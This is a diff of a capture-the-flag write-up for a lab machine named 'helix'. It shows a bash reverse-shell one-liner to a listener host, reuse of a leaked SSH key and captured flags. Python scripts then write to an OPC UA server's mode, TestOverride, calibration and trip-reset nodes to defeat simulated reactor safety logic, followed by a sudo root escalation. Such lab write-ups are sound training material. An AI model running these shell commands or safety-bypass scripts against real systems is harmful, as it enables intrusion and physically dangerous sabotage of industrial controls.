@@ -147,7 +147,7 @@ However, since we have UI access, the most straightforward way to get a shell is
     - **Command Arguments:** `-c bash -i >& /dev/tcp/10.10.14.163/4545 0>&1` (This is a classic one-liner reverse shell)
     - **Argument Delimiter:** `|` (This ensures the command is treated as a single argument)
 
-![[Pasted image 20260811210010.png]]
+![[Pasted image 20260811210010.png|700]]
 
 4. **Start the Listener:**
 ```bash
@@ -194,7 +194,7 @@ nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
 ```
 
 
-![[Pasted image 20260811215020.png]]
+![[Pasted image 20260811215020.png|700]]
 
 
 ### Reusing the SSH Key
@@ -207,7 +207,7 @@ chmod 600 sshkey
 ```
 
 
-![[Pasted image 20260811215239.png]]
+![[Pasted image 20260811215239.png|700]]
 
 
 3. **Attempt SSH login as `operator`:**
@@ -225,62 +225,227 @@ operator@helix:~$ cat user.txt
 62157af723e569735d8f95e71ae5df9a
 ```
 
-![[Pasted image 20260811215531.png]]
+![[Pasted image 20260811215531.png|700]]
 
 
 
-![[Pasted image 20260811221018.png]]
+---
 
+## Step 6: OPC UA Server Enumeration
 
-![[Pasted image 20260811220959.png]]
+### Discovering the OPC UA Service
 
-decrypt and open pdf
-
+Checking running services on the box reveals an interesting OPC UA server.
 ```bash
-└─$ qpdf --password=operator1 --decrypt "Operator Control & Safety Guide.pdf" decrypted.pdf
-
+operator@helix:~$ ss -tuln
 ```
 
+**Result:**
 ```bash
-└─$ xdg-open decrypted.pdf 
+LISTEN 0 50 127.0.0.1:4840
 ```
-
-
-
-![[Pasted image 20260811231408.png]]
-
 
 
 ![[Pasted image 20260811231541.png]]
 
 
+Port `4840` is the default port for OPC UA (Open Platform Communications Unified Architecture).
+
+**What is OPC UA?** OPC UA is an industrial communication protocol widely used in SCADA (Supervisory Control and Data Acquisition) and Industrial Control Systems (ICS) for data exchange between industrial devices and control systems.
+
+### Enumerating the OPC UA Plant Structure
+
+We need to enumerate the OPC UA server to find the specific nodes (variables) we can interact with.
+
+**Enumeration Script (`/tmp/enumerate.py`):**
+```python
+import asyncio
+from asyncua import Client
+
+async def main():
+    url = "opc.tcp://localhost:4840"
+
+    async with Client(url=url) as client:
+        print("[+] Connected to OPC UA server")
+
+        # Browse the Plant structure
+        for node_id in ["ns=2;i=2", "ns=2;i=7", "ns=2;i=11"]:
+            node = client.get_node(node_id)
+            name = await node.read_browse_name()
+            print(f"\n[{name}] NodeId: {node_id}")
+            children = await node.get_children()
+            for child in children:
+                cname = await child.read_browse_name()
+                try:
+                    val = await child.read_value()
+                except:
+                    val = "N/A"
+                print(f"  {cname.Name} | {child.nodeid} | {val}")
+
+asyncio.run(main())
+```
+
 
 ![[Pasted image 20260811231611.png]]
 
+
+**Running the Enumeration:**
+```bash
+python3 /tmp/enumerate.py
+```
 
 
 ![[Pasted image 20260811231622.png]]
 
 
+**Critical Variables Discovered:**
+- **Safety Group (`ns=2;i=7`):**
+    - `TripActive`: `False` (Triggers a safety shutdown if true)
+    - `EmergencyCooling`: `False`
+    - `RodsInserted`: `False`
+- **Control Group (`ns=2;i=11`):**
+    - `Mode`: `NORMAL`
+    - `TestOverride`: `False`
+    - `ResetTrip`: `False`
+- **Reactor Group (`ns=2;i=2`):**
+    - `Temperature`: ~283.3 °C
+    - `Pressure`: ~68.9 bar
+    - `CalibrationOffset`: 0.0
+
+**Why This Matters:** The PLC (Programmable Logic Controller) enforces safety logic. Normal operation mode locks out certain maintenance actions. The `CalibrationOffset` variable allows us to manipulate the readings the PLC sees. We can fool the PLC into believing the reactor has cooled down, triggering a maintenance window.
 
 
-![[Pasted image 20260811231902.png]]
+---
+
+## Step 7: Forcing the Maintenance Window
+
+### Exploit Strategy
+1. Set the reactor to `MAINTENANCE` mode.
+2. Enable `TestOverride` to bypass safety limits.
+3. Manipulate the `CalibrationOffset` to make the PLC think the temperature has exceeded `295°C`, which triggers a system reset and opens a maintenance window.
+
+**Trigger Script (`/tmp/trigger_maint.py`):**
+```python
+import asyncio
+from asyncua import Client
+from asyncua.ua import DataValue, Variant, VariantType
+
+async def main():
+    url = "opc.tcp://localhost:4840"
+
+    async with Client(url=url) as client:
+        print("[+] Connected to OPC UA server")
+
+        # Get all nodes
+        mode_node = client.get_node("ns=2;i=12")
+        override_node = client.get_node("ns=2;i=13")
+        offset_node = client.get_node("ns=2;i=6")
+        temp_node = client.get_node("ns=2;i=4")
+        pressure_node = client.get_node("ns=2;i=5")
+        trip_node = client.get_node("ns=2;i=10")
+
+        # Step 1: Set Mode to MAINTENANCE
+        print("[*] Setting Mode = MAINTENANCE")
+        await mode_node.write_value(DataValue(Variant("MAINTENANCE", VariantType.String)))
+        await asyncio.sleep(1)
+        print(f"    Mode: {await mode_node.read_value()}")
+
+        # Step 2: Enable TestOverride
+        print("[*] Enabling TestOverride")
+        await override_node.write_value(DataValue(Variant(True, VariantType.Boolean)))
+        await asyncio.sleep(1)
+        print(f"    TestOverride: {await override_node.read_value()}")
+
+        # Step 3: Ramp CalibrationOffset until temperature >= 295
+        print("[*] Ramping CalibrationOffset...")
+        offset = 0.0
+        while True:
+            trip = await trip_node.read_value()
+            temp = await temp_node.read_value()
+            pressure = await pressure_node.read_value()
+            print(f"  Offset={offset:.1f} Temp={temp:.1f} Pressure={pressure:.1f} Trip={trip}")
+
+            if trip:
+                print("[*] TRIP ACTIVE - resetting trip first...")
+                reset_node = client.get_node("ns=2;i=14")
+                await reset_node.write_value(DataValue(Variant(True, VariantType.Boolean)))
+                await asyncio.sleep(1)
+                await reset_node.write_value(DataValue(Variant(False, VariantType.Boolean)))
+                continue
+
+            if (temp >= 295 or pressure >= 73) and not trip:
+                print("[+] MAINTENANCE WINDOW OPEN!")
+                break
+
+            offset += 1.0
+            await offset_node.write_value(DataValue(Variant(offset, VariantType.Double)))
+            await asyncio.sleep(2)
+
+asyncio.run(main())
+```
 
 
 
-![[Pasted image 20260811231916.png]]
+![[Pasted image 20260811231902.png|700]]
 
 
-
-![[Pasted image 20260811231938.png]]
-
-
-
-![[Pasted image 20260811231948.png]]
+**Executing the Exploit:**
+```bash
+python3 /tmp/trigger_maint.py
+```
 
 
+![[Pasted image 20260811231916.png|700]]
+
+
+**What Happened:**
+1. The reactor was placed in maintenance mode.
+2. We successfully bypassed safety trip logic using `TestOverride`.
+3. By ramping `CalibrationOffset` to 11.0, the PLC calculated a perceived temperature of **295.4°C**.
+4. The system entered the trip reset sequence, successfully opening a "Maintenance Window".
+
+
+---
+
+## Step 8: Privilege Escalation to Root
+
+### Leveraging the Maintenance Console
+
+The `operator` user has `sudo` privileges on a specific binary that is only unlocked during the maintenance window.
+
+```bash
+operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
+```
+
+**Result:**
+```text
+[+] Privileged maintenance access granted
+[!] Window expires in 101 seconds
+[!] Session will be terminated automatically
+root@helix:/home/operator#
+```
+
+
+![[Pasted image 20260811231938.png|700]]
+We now have a **root shell** for ~101 seconds. We can immediately read the root flag.
+
+```bash
+root@helix:/home/operator# cat /root/root.txt
+b7809f5b9c6404628d5b20fc70cadb1b
+```
+
+
+![[Pasted image 20260811231948.png|700]]
+
+
+---
+
+## Step 9: Machine Owned
 
 ![[Pasted image 20260811232005.png]]
 
+
+----
+---
 
 
